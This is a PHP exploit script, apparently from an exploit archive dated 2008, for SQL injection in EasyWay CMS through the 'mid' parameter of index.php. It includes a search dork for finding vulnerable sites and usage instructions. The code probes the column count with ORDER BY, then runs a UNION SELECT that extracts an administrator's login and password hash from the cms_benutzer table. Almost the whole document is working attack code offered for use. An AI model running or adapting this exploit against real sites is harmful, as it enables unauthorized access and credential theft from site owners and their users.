EasyWay CMS (index.php mid) Remote SQL Injection Exploit
========================================================




<?php
ini_set("max_execution_time",0);
print_r(&#039;
###############################################################
#
#           EasyWay CMS - SQL Injection Exploit     
#                                                             
#      Vulnerability discovered by: Lidloses_Auge             
#      Exploit coded by:            Lidloses_Auge
#      Greetz to:                   -=Player=- , Suicide, g4ms3, enco,
#                                           GPM, Free-Hack
#      Date:                        30.05.2008
#
###############################################################
#                                                             
#      Dork:  inurl:"index.php?css=mid=art="
#      Admin Panel: [Target]/cms/
#      Usage: php &#039;.$argv[0].&#039; [Target] [Userid]
#      Example for "http://www.site.com/index.php?css=1&mid=100&art=1"
#      => php &#039;.$argv[0].&#039; http://www.site.com 1
#                                                             
###############################################################
&#039;);
if ($argc == 3) {
echo "\nExploiting in progress:";
$url = $argv[1];
$source = file_get_contents($url.&#039;/index.php?mid=null+order+by+100/*&#039;);
$errorcount = substr_count($source,&#039;not a valid MySQL&#039;);
$sql = &#039;/index.php?mid=null+union+select+&#039;;
for ($i = 25; $i>=1; $i--) {
   $source = file_get_contents($url.&#039;/index.php?mid=null+order+by+&#039;.$i.&#039;/*&#039;);
   if (substr_count($source,&#039;not a valid MySQL&#039;)!=$errorcount) {
      $errorcount2 = $i;
      $i = 1;
   }
}
for ($j=1; $j<$errorcount2; $j++) {
   $sql = $sql.&#039;concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a),&#039;;   
}
$sql = $sql.&#039;concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a)+from+cms_benutzer+where+id=&#039;.$argv[2].&#039;/*&#039;;
$source = file_get_contents($url.$sql);
echo "\n";
if (strpos($source,&#039;::::&#039;)!=0) {
   echo &#039;User: &#039;.substr($source,strpos($source,&#039;::::&#039;)+5,strpos($source,&#039;::1::&#039;)-strpos($source,&#039;::::&#039;)-5)."\n";
   echo &#039;Hash: &#039;.substr($source,strpos($source,&#039;::1::&#039;)+5,strpos($source,&#039;::2::&#039;)-strpos($source,&#039;::1::&#039;)-5)."\n";
} else {
   echo &#039;Exploit failed!&#039;."\n";
}
} else {
echo "\nNot enough arguments!\n";
}
?>



